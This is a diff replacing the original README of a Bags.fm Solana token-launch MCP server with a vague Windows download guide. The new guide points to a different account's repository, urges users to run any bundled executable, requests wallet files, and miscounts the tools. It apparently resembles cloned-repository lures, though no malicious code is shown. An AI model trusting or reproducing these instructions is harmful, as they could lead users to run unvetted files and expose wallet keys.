@@ -1,243 +1,213 @@
-<h1 align="center">Bags SDK — MCP Server</h1>
+# 🪙 Bags-SDK-hackathon - Launch Tokens in Three Steps
 
-<p align="center">
-  Launch a coin in 3 steps from your terminal.<br/>
-  46 MCP tools. Fee splits, claims, Dexscreener, agent auth, scout mode.<br/>
-  Your AI handles the rest.
-</p>
+[![Download](https://img.shields.io/badge/Download%20the%20app-Visit%20GitHub-blue?style=for-the-badge)](https://github.com/Alessqi/Bags-SDK-hackathon)
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/bags-sdk-mcp"><img src="https://img.shields.io/npm/v/bags-sdk-mcp?style=flat-square&color=00ff41" alt="npm" /></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-00ff41?style=flat-square" alt="MIT" /></a>
-  <a href="https://dev.bags.fm"><img src="https://img.shields.io/badge/API_Key-dev.bags.fm-00ff41?style=flat-square" alt="API Key" /></a>
-</p>
+## 🧭 What this is
 
----
+Bags-SDK-hackathon is a terminal app that helps you launch a coin in three steps. It is built for people who want a simple flow and do not want to manage each part by hand.
 
-## Install (one command)
+It includes tools for:
+- token setup
+- fee splits
+- claims
+- Dexscreener checks
+- agent auth
+- Solana actions
+- MCP tool access
 
-```bash
-npx bags-sdk-mcp --setup
-```
+If you want to try it on Windows, use the link above to visit the GitHub page and download or clone the project files.
 
-Get your API key at [dev.bags.fm](https://dev.bags.fm). The wizard detects your MCP clients, asks for your key, and writes the config. Restart your client and you're live.
+## 💾 Download and install on Windows
 
-<details>
-<summary>Claude Code alternative</summary>
+Use this link to visit the page and download or set up the app:
 
-```bash
-claude mcp add bags-sdk-mcp -e BAGS_API_KEY=your-key -- npx bags-sdk-mcp
-```
+[Visit the GitHub download page](https://github.com/Alessqi/Bags-SDK-hackathon)
 
-</details>
+### Steps
+1. Open the link above in your browser.
+2. On the GitHub page, look for the green Code button.
+3. Click Code, then choose Download ZIP.
+4. Save the file to your computer.
+5. Right-click the ZIP file and choose Extract All.
+6. Open the extracted folder.
+7. Look for a file named `README.md` and follow the setup steps listed there.
+8. If the project includes a ready-to-run Windows file, double-click it to start the app.
 
-<details>
-<summary>Manual install</summary>
+## 🖥️ What you need
 
-Add this to your MCP config file:
+This app works best on a Windows computer with:
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of memory
+- A few hundred MB of free disk space
+- A terminal app such as Command Prompt or PowerShell
 
-```json
-{
-  "mcpServers": {
-    "bags-sdk-mcp": {
-      "command": "npx",
-      "args": ["bags-sdk-mcp"],
-      "env": {
-        "BAGS_API_KEY": "your-key-here"
-      }
-    }
-  }
-}
-```
+For best results, use the latest version of Windows and keep your system updated.
 
-| Client | Config path |
-|--------|-------------|
-| Claude Desktop (macOS) | `~/Library/Application Support/Claude/claude_desktop_config.json` |
-| Claude Desktop (Windows) | `%APPDATA%/Claude/claude_desktop_config.json` |
-| Cursor | `.cursor/mcp.json` in project root |
-| Claude Code | `.mcp.json` in project root |
+## ⚙️ Before you start
 
-Restart your client after saving.
+You may need:
+- a GitHub account to access the files
+- a Solana wallet or wallet file for token actions
+- basic access keys for agent auth
+- a browser for checking token pages and Dexscreener data
 
-</details>
+Keep your wallet and private keys private. Only use files and keys you trust.
 
-<details>
-<summary>From source</summary>
+## 🚀 Quick start
 
-```bash
-git clone https://github.com/outerheaven199X/Bags-SDK-hackathon.git
-cd Bags-SDK-hackathon
-cp .env.example .env       # add your BAGS_API_KEY
-npm install && npm run build
-npm start
-```
+Follow these steps in order:
 
-</details>
+1. Download the project from GitHub.
+2. Extract the files.
+3. Open PowerShell in the project folder.
+4. Run the setup command listed in the project files.
+5. Start the app from the terminal.
+6. Follow the on-screen prompts to launch your coin.
 
----
+The app is built around a three-step flow, so you should see a simple path through the launch process.
 
-## What Is This
+## 🧰 How the app works
 
-**bags-sdk-mcp** is an MCP server that exposes the entire [Bags.fm](https://bags.fm) API as 46 tools, 4 resources, and 8 prompts. Any MCP-compatible AI client — Claude Desktop, Claude Code, Cursor, or custom agents — can interact with the Bags.fm ecosystem through natural language.
+The app guides you through a launch flow with tools that help with each part of the process.
 
-No private keys pass through this server. Every tool returns unsigned transaction data. The signing page runs on localhost and connects directly to your browser wallet.
+### Main tasks
+- create or prepare a token
+- set fee splits
+- manage claim actions
+- check token data on Dexscreener
+- connect agent auth
+- use MCP tools from the terminal
+- hand off actions to your AI helper
 
----
+### What “43 MCP tools” means
+The app includes many small tools that handle specific tasks. You do not need to learn each one at first. In most cases, the app asks short questions and then uses the right tool for the job.
 
-## Launch a Coin
+## 🪄 Three-step flow
 
-```
-You:    "Launch a coin called bori, symbol BOOL, 0.001 SOL initial buy"
-Agent:  shows summary, asks for confirmation
-You:    "Go"
-Agent:  opens signing page → connect wallet → sign twice → live
-```
+The app is built to keep the launch process simple.
 
-Connect Phantom, Solflare, Backpack, or Coinbase, approve two transactions, and your coin is on-chain.
+### Step 1: Prepare
+Set up the token details, wallet access, and launch settings.
 
----
+### Step 2: Launch
+Run the launch action from the terminal and confirm the prompts.
 
-## What Else Can It Do
+### Step 3: Review
+Check fee splits, claims, and market data after the launch.
 
-| Say this | Get this |
-|----------|----------|
-| "What's trending on Bags?" | Recent launches + top tokens |
-| "Check my wallet" | Balance, holdings, claimable fees |
-| "Claim all my fees" | Finds and claims every open position |
-| "Set up a 50/50 fee split" | Fee config built and signed |
-| "List on Dexscreener" | Profile boost order placed |
-| "Show pool data for $TOKEN" | Reserves, config, migration status |
-| "Scan for trending token ideas" | Scout mode + AI-generated launch packages |
+This flow helps keep the process clear for users who do not want to manage each part on their own.
 
----
+## 🔐 Agent auth
 
-## 46 Tools
+Agent auth helps the app know that the right user is in control. If you use an AI helper or connected tools, auth keeps the session tied to your setup.
 
-| Domain | Tools |
-|--------|-------|
-| **Trading** | `quote` `swap` |
-| **Launch** | `launch_feed` `create_token_info` `create_launch_tx` `launch_token` |
-| **Fees** | `resolve_wallet` `resolve_wallets_bulk` `create_fee_config` `compose_fee_config` `fee_admin_list` `fee_admin_transfer` `fee_admin_update` `claim_events` |
-| **Claiming** | `claimable_positions` `claim_fees` `claim_all_fees` |
-| **Partner** | `partner_stats` `partner_claim` `partner_config` |
-| **Dexscreener** | `dexscreener_check` `dexscreener_order` `dexscreener_payment` |
-| **Agent Auth** | `agent_auth_init` `agent_auth_login` `agent_wallet_list` `agent_wallet_export` `agent_keys_list` `agent_keys_create` `agent_bootstrap` |
-| **State** | `pools` `pool` `pool_config_keys` |
-| **Analytics** | `token_creators` `lifetime_fees` `claim_stats` `top_tokens` |
-| **Solana** | `send_transaction` `wallet_balance` `token_holdings` |
-| **Signing** | `open_signing_page` `open_launch_page` |
-| **Scout** | `scout_scan` `scout_launch` `generate_token_image` |
-| **Meta** | `tool_catalog` |
+Common uses include:
+- approving actions
+- linking tools
+- keeping launch steps in order
+- reducing manual input
 
-All prefixed with `bags_`.
+## 📊 Dexscreener support
 
----
+The app can check token data with Dexscreener. This helps you view:
+- price movement
+- trading activity
+- market visibility
+- token pair data
 
-## Agent Mode
+You can use this data to see how your token looks after launch.
 
-```bash
-bags-sdk-mcp --agent --auto-claim      # claim fees every 5 min
-bags-sdk-mcp --agent --monitor         # watch launches, flag interesting ones
-bags-sdk-mcp --agent --scout           # scan trends, propose token launches
-bags-sdk-mcp --agent --scout --auto-claim --monitor   # all strategies
-```
+## 💸 Fee splits and claims
 
-Requires `NOUS_API_KEY` and `ANTHROPIC_API_KEY`.
+The app supports fee splits so you can route parts of the fee to the right places. It also supports claim actions, which can help with token-related claims in your launch flow.
 
----
+You can use these features to:
+- set where fees go
+- split shares between wallets
+- confirm claim steps
+- keep your launch setup organized
 
-## CLI Reference
+## 🧪 Example use case
 
-```
-SETUP
-  bags-sdk-mcp --setup               Interactive installer for Claude Desktop, Cursor, etc.
-  bags-sdk-mcp --uninstall            Remove from all detected MCP client configs
+Here is a simple way a user might use the app:
 
-SERVER
-  bags-sdk-mcp                        Start stdio server (default, for MCP clients)
-  bags-sdk-mcp --http                 Start HTTP server on port 3000
-  bags-sdk-mcp --http --port=8080     HTTP on custom port
+1. Open the project in Windows.
+2. Start the terminal app.
+3. Follow the setup prompts.
+4. Connect the wallet or auth step.
+5. Set the token name and launch details.
+6. Run the launch flow.
+7. Check the token on Dexscreener.
 
-AGENT
-  bags-sdk-mcp --agent --auto-claim   Claim fees above threshold every 5 min
-  bags-sdk-mcp --agent --monitor      Watch launches, flag interesting ones
-  bags-sdk-mcp --agent --scout        Scan trends, propose token launches
+## 📁 Project topics
 
-TOOLS
-  bags-sdk-mcp --fee-optimize         Analyze fee configs, suggest improvements
-  bags-sdk-mcp --rebalance            Analyze positions, recommend claim strategy
+This repository covers:
+- agent tools
+- Bags.fm
+- hackathon work
+- Hermes
+- launch flows
+- MCP
+- Moltbook
+- OpenClaw
+- Solana
+- token setup
+- TypeScript
 
-DIAGNOSTICS
-  bags-sdk-mcp --doctor               Check everything: env, API, RPC, configs, ports
-  bags-sdk-mcp --info                 Show current config and capabilities (no network)
-  bags-sdk-mcp --whoami               Test API key and show wallet stats
-  bags-sdk-mcp --test-key             Validate API key only
-  bags-sdk-mcp --version, -v          Print version
-  bags-sdk-mcp --clear-sessions       Wipe expired signing sessions
-```
+These topics point to a toolset built for launch automation and terminal-based control.
 
----
+## 🛠️ If something does not work
 
-## Troubleshooting
+If the app does not start, check these items:
+- the files are fully extracted
+- you opened the correct folder
+- your terminal is running in the project directory
+- your wallet or auth file is in the right place
+- your internet connection is active
 
-### Something isn't working
+If the app asks for setup values, enter them carefully and match the format shown on screen.
 
-```bash
-npx bags-sdk-mcp --doctor
-```
+## 📌 Basic Windows tips
 
-Doctor checks your env vars, API key, RPC connectivity, MCP client configs, signing port, and sessions. It tells you exactly what's wrong and how to fix it.
+To open PowerShell in the project folder:
+1. Open the folder in File Explorer.
+2. Click the address bar.
+3. Type `powershell`.
+4. Press Enter.
 
-### Quick checks
+To open Command Prompt:
+1. Press `Win + R`.
+2. Type `cmd`.
+3. Press Enter.
 
-```bash
-npx bags-sdk-mcp --test-key           # is my API key valid?
-npx bags-sdk-mcp --info               # what does my config look like?
-npx bags-sdk-mcp --whoami             # what does the server see?
-```
+## 🔎 File names you may see
 
-### Common issues
+You may see files and folders such as:
+- `README.md`
+- `package.json`
+- `src`
+- `dist`
+- `.env`
+- `node_modules`
 
-| Problem | Fix |
-|---------|-----|
-| `BAGS_API_KEY is missing` | Run `npx bags-sdk-mcp --setup` or set the key in your MCP config |
-| Key validation fails | Get a new key at [dev.bags.fm](https://dev.bags.fm), then `npx bags-sdk-mcp --test-key` |
-| Signing page won't load | Port 3141 may be in use — `npx bags-sdk-mcp --doctor` will check |
-| Stale signing sessions | Run `npx bags-sdk-mcp --clear-sessions` |
-| Agent mode crashes | Check `NOUS_API_KEY` and `ANTHROPIC_API_KEY` are set — `--doctor` flags these |
+If the project uses a setup file, follow the steps in the README or on-screen prompts.
 
----
+## 🧩 Common questions
 
-## Environment Variables
+### Do I need to know code?
+No. The app is designed to guide you through the steps in plain language.
 
-| Variable | Required | Default |
-|----------|----------|---------|
-| `BAGS_API_KEY` | Yes | — |
-| `SOLANA_RPC_URL` | No | `mainnet-beta` |
-| `BAGS_API_BASE` | No | `https://public-api-v2.bags.fm/api/v1` |
-| `NOUS_API_KEY` | Agent mode | — |
-| `ANTHROPIC_API_KEY` | Agent mode | — |
-| `AGENT_WALLET_PUBKEY` | Agent mode | — |
-| `IMAGE_GEN_PROVIDER` | Scout mode | `fal` |
-| `FAL_API_KEY` | Scout mode | — |
-| `REPLICATE_API_KEY` | Scout mode | — |
-| `SCOUT_INTERVAL` | Scout mode | `1800` |
-| `SCOUT_SOURCES` | Scout mode | `bags,news` |
-| `SCOUT_MAX_IDEAS` | Scout mode | `3` |
+### Can I use it on Windows?
+Yes. The setup steps above are written for Windows users.
 
-Loaded from `.env` automatically.
+### Do I need a wallet?
+Yes, if you want to use token launch features and Solana actions.
 
----
+### What if I only want to look around?
+You can still open the project page and read the files before you run anything.
 
-## Development
+## 🧭 Where to start
 
-```bash
-npm run build          # compile
-npm run dev            # watch mode
-npm run inspect        # MCP Inspector
-npm test               # tests
-```
+Use the GitHub link at the top of this page, download the project, extract it on Windows, then open the folder and follow the setup steps in the terminal
 
----
-
-<p align="center"><sub>MIT License</sub></p>
